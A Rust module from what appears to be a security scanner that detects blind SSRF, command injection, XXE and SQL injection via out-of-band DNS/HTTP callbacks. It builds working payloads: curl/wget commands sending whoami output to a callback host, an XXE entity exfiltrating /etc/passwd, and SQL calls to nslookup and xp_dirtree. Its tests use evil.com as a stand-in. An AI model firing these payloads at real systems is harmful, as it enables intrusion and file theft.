//! OOB (Out-of-Band) Callback Engine
//!
//! Detects BLIND vulnerabilities where the response is sent to an external
//! server instead of reflected in the HTTP response.
//!
//! Supported:
//! - Blind SSRF (Server-Side Request Forgery → attacker server)
//! - Blind RCE (Command Injection → DNS/HTTP callback)
//! - Blind XXE (XML External Entity → attacker DTD)
//! - Blind SQL Injection (data exfiltration via DNS)
//! - Blind XSS (cookie/credential exfiltration)
//!
//! Architecture:
//! 1. Generate unique OOB domain (UUID-based per-scan)
//! 2. Inject payload with OOB URL into scan modules
//! 3. Start local listener (DNS + HTTP)
//! 4. Wait for callback
//! 5. Match callback to payload → report as confirmed OOB vuln

use crate::types::Severity;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::Mutex;

/// OOB callback entry
#[derive(Debug, Clone)]
pub struct OobCallback {
    pub id: String,
    pub unique_id: String,
    pub payload: String,
    pub target: String,
    pub callback_type: CallbackType,
    pub timestamp: Instant,
    pub source_ip: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum CallbackType {
    Dns,
    Http,
    Https,
}

/// OOB session — manages unique IDs and listener state
pub struct OobSession {
    pub session_id: String,
    pub domain: String,
    pub callbacks: Arc<Mutex<Vec<OobCallback>>>,
    pub enabled: bool,
}

impl OobSession {
    pub fn new(domain: Option<String>) -> Self {
        let session_id = generate_uuid();
        let domain = domain.unwrap_or_else(|| format!("{}.oob.kobra.sh", session_id));
        Self {
            session_id,
            domain,
            callbacks: Arc::new(Mutex::new(Vec::new())),
            enabled: true,
        }
    }

    /// Generate unique OOB URL for injection
    pub fn generate_url(&self, prefix: &str) -> String {
        format!("http://{}.{}.{}", prefix, generate_uuid_short(), self.domain)
    }

    /// Generate DNS lookup payload
    pub fn generate_dns(&self, prefix: &str) -> String {
        format!("{}.{}.{}", prefix, generate_uuid_short(), self.domain)
    }

    /// Record a callback (called by DNS/HTTP listeners)
    pub async fn record_callback(&self, callback: OobCallback) {
        let mut cbs = self.callbacks.lock().await;
        cbs.push(callback);
    }

    /// Get all callbacks for a specific unique_id
    pub async fn get_callbacks_for(&self, unique_id: &str) -> Vec<OobCallback> {
        let cbs = self.callbacks.lock().await;
        cbs.iter().filter(|c| c.unique_id == unique_id).cloned().collect()
    }

    /// Get all callbacks
    pub async fn get_all_callbacks(&self) -> Vec<OobCallback> {
        self.callbacks.lock().await.clone()
    }
}

/// Generate UUID-like string for OOB IDs
fn generate_uuid() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    format!("{:x}{:x}", now.as_secs(), now.subsec_nanos())
}

fn generate_uuid_short() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    let n = now.as_nanos() as u64;
    format!("{:x}", n & 0xffffffff)
}

/// OOB payload generator — creates payloads for each vuln class
pub struct OobPayloads {
    pub session: Arc<OobSession>,
}

impl OobPayloads {
    pub fn new(session: Arc<OobSession>) -> Self {
        Self { session }
    }

    /// SSRF payloads — inject OOB URLs into URL parameters
    pub async fn ssrf_payloads(&self) -> Vec<String> {
        let mut payloads = Vec::new();
        // Various protocols
        for proto in &["http", "https", "gopher", "ftp", "dict", "ldap"] {
            let url = self.session.generate_url("ssrf");
            payloads.push(format!("{}://{}/", proto, url));
            payloads.push(format!("{}://{}:80/", proto, url));
        }
        payloads
    }

    /// RCE payloads — use DNS callback to detect command execution
    pub async fn rce_payloads(&self) -> Vec<String> {
        let mut payloads = Vec::new();
        // Bash/curl
        payloads.push(format!(
            "curl -s http://{}/$(whoami) > /dev/null",
            self.session.generate_url("rce")
        ));
        // Bash/wget
        payloads.push(format!(
            "wget -q -O /dev/null http://{}/$(whoami)",
            self.session.generate_url("rce")
        ));
        // Windows/curl
        payloads.push(format!(
            "curl http://{}/%USERNAME% -o nul",
            self.session.generate_url("rce")
        ));
        // DNS-based (works even if HTTP blocked)
        payloads.push(format!(
            "$(curl http://{})",
            self.session.generate_url("rce-dns")
        ));
        payloads
    }

    /// XXE payloads — external DTD that calls back
    pub async fn xxe_payloads(&self) -> Vec<String> {
        let mut payloads = Vec::new();
        let url = self.session.generate_url("xxe");
        // External DTD
        payloads.push(format!(
            r#"<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{}/xxe.dtd"> %xxe;]>"#,
            url
        ));
        // Parameter entity
        payloads.push(format!(
            r#"<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{}/?data=%file;'>"> %eval; %exfil;]>"#,
            url
        ));
        payloads
    }

    /// Blind SQLi payloads — use DNS exfiltration
    pub async fn sqli_dns_payloads(&self) -> Vec<String> {
        let mut payloads = Vec::new();
        // PostgreSQL — COPY ... FROM PROGRAM (requires superuser, rare but classic)
        let dns = self.session.generate_dns("sqli");
        payloads.push(format!(
            "'; COPY (SELECT '') TO PROGRAM 'nslookup {}'--",
            dns
        ));
        // MySQL — LOAD_FILE + INTO OUTFILE (requires FILE privilege)
        payloads.push(format!(
            "'; SELECT LOAD_FILE('\\\\{}\\test')--",
            dns
        ));
        // MSSQL — xp_dirtree (requires sysadmin)
        payloads.push(format!(
            "'; EXEC xp_dirtree '\\\\{}\\share'--",
            dns
        ));
        payloads
    }
}

/// Result of OOB scan for a specific payload
#[derive(Debug, Clone)]
pub struct OobResult {
    pub unique_id: String,
    pub payload: String,
    pub target: String,
    pub category: String,
    pub received: bool,
    pub callback_type: Option<CallbackType>,
    pub wait_duration: Duration,
}

/// Wait for callbacks matching unique_ids with timeout
pub async fn wait_for_callbacks(
    session: Arc<OobSession>,
    unique_ids: Vec<String>,
    timeout: Duration,
) -> Vec<OobResult> {
    let start = Instant::now();
    let mut results = Vec::new();

    while start.elapsed() < timeout {
        // Check for callbacks
        for uid in &unique_ids {
            let cbs = session.get_callbacks_for(uid).await;
            if !cbs.is_empty() {
                let cb = &cbs[0];
                results.push(OobResult {
                    unique_id: uid.clone(),
                    payload: format!("{:?}", cb.payload),
                    target: format!("OOB callback to {}", session.domain),
                    category: "OOB-CALLBACK".to_string(),
                    received: true,
                    callback_type: Some(cb.callback_type.clone()),
                    wait_duration: start.elapsed(),
                });
            }
        }

        if results.len() == unique_ids.len() {
            break;  // All callbacks received
        }

        tokio::time::sleep(Duration::from_millis(100)).await;
    }

    // Fill in missing results
    for uid in &unique_ids {
        if !results.iter().any(|r| &r.unique_id == uid) {
            results.push(OobResult {
                unique_id: uid.clone(),
                payload: "".to_string(),
                target: format!("OOB callback to {}", session.domain),
                category: "OOB-CALLBACK".to_string(),
                received: false,
                callback_type: None,
                wait_duration: start.elapsed(),
            });
        }
    }

    results
}

/// Convert OOB result to KOBRA Finding
pub fn oob_to_finding(result: &OobResult, category: &str, payload: &str) -> crate::types::Finding {
    use crate::types::Finding;
    let severity = if result.received { Severity::Critical } else { Severity::Info };
    Finding::new(
        severity,
        category,
        &format!("OOB {} confirmed via callback", category),
        &result.target,
    )
    .with_payload(payload)
    .with_evidence(&format!(
        "Callback received: {}, type: {:?}, wait: {:?}",
        result.received,
        result.callback_type,
        result.wait_duration
    ))
    .with_confidence(if result.received { 95 } else { 0 })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn session_creation() {
        let session = OobSession::new(None);
        assert!(session.enabled);
        assert!(session.domain.contains(".oob.kobra.sh"));
    }

    #[test]
    fn session_custom_domain() {
        let session = OobSession::new(Some("test.example.com".to_string()));
        assert_eq!(session.domain, "test.example.com");
    }

    #[test]
    fn url_generation() {
        let session = OobSession::new(None);
        let url = session.generate_url("test");
        assert!(url.starts_with("http://test."));
        assert!(url.contains(".oob.kobra.sh"));
    }

    #[tokio::test]
    async fn record_and_get_callback() {
        let session = Arc::new(OobSession::new(None));
        let cb = OobCallback {
            id: "test-1".to_string(),
            unique_id: "uid-123".to_string(),
            payload: "test".to_string(),
            target: "http://test.com".to_string(),
            callback_type: CallbackType::Http,
            timestamp: Instant::now(),
            source_ip: Some("127.0.0.1".to_string()),
        };
        session.record_callback(cb).await;
        let cbs = session.get_callbacks_for("uid-123").await;
        assert_eq!(cbs.len(), 1);
    }

    #[tokio::test]
    async fn ssrf_payloads_generated() {
        let session = Arc::new(OobSession::new(None));
        let payloads = OobPayloads::new(session);
        let ssrf = payloads.ssrf_payloads().await;
        assert!(!ssrf.is_empty());
        assert!(ssrf.iter().any(|p| p.starts_with("http://")));
    }

    #[tokio::test]
    async fn rce_payloads_generated() {
        let session = Arc::new(OobSession::new(None));
        let payloads = OobPayloads::new(session);
        let rce = payloads.rce_payloads().await;
        assert!(!rce.is_empty());
        // Should contain $(...) or %...% for command substitution
        assert!(rce.iter().any(|p| p.contains("$(") || p.contains("%")));
    }

    #[tokio::test]
    async fn xxe_payloads_valid() {
        let session = Arc::new(OobSession::new(None));
        let payloads = OobPayloads::new(session);
        let xxe = payloads.xxe_payloads().await;
        assert!(!xxe.is_empty());
        assert!(xxe[0].contains("ENTITY"));
        assert!(xxe[0].contains("SYSTEM"));
    }

    #[tokio::test]
    async fn sqli_dns_payloads() {
        let session = Arc::new(OobSession::new(None));
        let payloads = OobPayloads::new(session);
        let sqli = payloads.sqli_dns_payloads().await;
        assert!(!sqli.is_empty());
        assert!(sqli.iter().any(|p| p.contains("nslookup") || p.contains("EXEC")));
    }

    #[test]
    fn oob_to_finding_callback_received() {
        let result = OobResult {
            unique_id: "uid".to_string(),
            payload: "test".to_string(),
            target: "http://test.com".to_string(),
            category: "OOB-CALLBACK".to_string(),
            received: true,
            callback_type: Some(CallbackType::Dns),
            wait_duration: Duration::from_millis(500),
        };
        let finding = oob_to_finding(&result, "SSRF", "http://evil.com");
        assert!(matches!(finding.severity, Severity::Critical));
        assert_eq!(finding.confidence, 95);
    }

    #[test]
    fn oob_to_finding_no_callback() {
        let result = OobResult {
            unique_id: "uid".to_string(),
            payload: "".to_string(),
            target: "http://test.com".to_string(),
            category: "OOB-CALLBACK".to_string(),
            received: false,
            callback_type: None,
            wait_duration: Duration::from_secs(10),
        };
        let finding = oob_to_finding(&result, "SSRF", "http://evil.com");
        assert!(matches!(finding.severity, Severity::Info));
        assert_eq!(finding.confidence, 0);
    }
}